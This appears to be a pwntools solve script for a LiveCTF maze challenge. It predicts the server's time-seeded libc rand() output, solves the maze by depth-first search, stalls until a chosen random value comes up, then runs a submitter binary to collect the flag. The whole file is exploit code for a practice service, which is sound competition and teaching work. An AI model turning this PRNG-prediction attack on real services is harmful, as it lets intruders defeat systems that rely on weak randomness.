from collections import deque
from pwn import *
import ctypes

ctypes.cdll.LoadLibrary("libc.so.6")
libc = ctypes.CDLL("libc.so.6")

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


class MazeSolver:
    def __init__(self, maze):
        self.maze = maze
        self.height = len(maze)
        self.width = len(maze[0])
        self.visited = [[False] * self.width for _ in range(self.height)]
        self.directions = {'n': (-1, 0), 'w': (0, -1),
                           's': (1, 0), 'e': (0, 1)}
        self.path = []

    def solve(self):
        start = self.find_start()
        self.dfs(start[0], start[1])
        return ''.join(self.path)

    def find_start(self):
        for row in range(self.height):
            for col in range(self.width):
                if self.maze[row][col] == '@':
                    return row, col

    def dfs(self, row, col):
        if self.maze[row][col] == '*':
            return True

        self.visited[row][col] = True

        for direction in self.directions:
            dx, dy = self.directions[direction]
            new_row, new_col = row + dx, col + dy

            if self.is_valid_move(new_row, new_col):
                self.path.append(direction)
                if self.dfs(new_row, new_col):
                    return True
                self.path.pop()

        return False

    def is_valid_move(self, row, col):
        return 0 <= row < self.height and 0 <= col < self.width and \
            not self.visited[row][col] and self.maze[row][col] != '#'


def solve_maze(maze_text):
    maze_rows = maze_text.strip().split('\n')
    maze = [list(row) for row in maze_rows]

    solver = MazeSolver(maze)
    path = solver.solve()
    print('Path to the finish:', path)
    return path


#context.log_level = "debug"
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
#p = process("./challenge")

libc.srand(libc.time(None))
counter = 0

for i in range(591):
    val = libc.rand()
p.recvuntil("torment: ")
p.sendline("a")
p.recvuntil("maze.\n")
maze = p.recvuntil("\nYou", drop=True)
maze = str(maze, "utf-8").strip()
print(maze)
keys = solve_maze(maze)
print(keys)

for k in keys[:-1]:
    libc.rand()
    p.sendlineafter(b"torment: ", k)

while True:
    val = libc.rand()
    if val % 1213 == 1212:
        break
    p.sendlineafter(b"torment: ", b"l")

p.sendline(keys[-1])
# p.interactive()
p.sendline(b'./submitter')

flag = p.recvline_contains(b'LiveCTF{').decode().strip()

log.info('Flag: %s', flag)
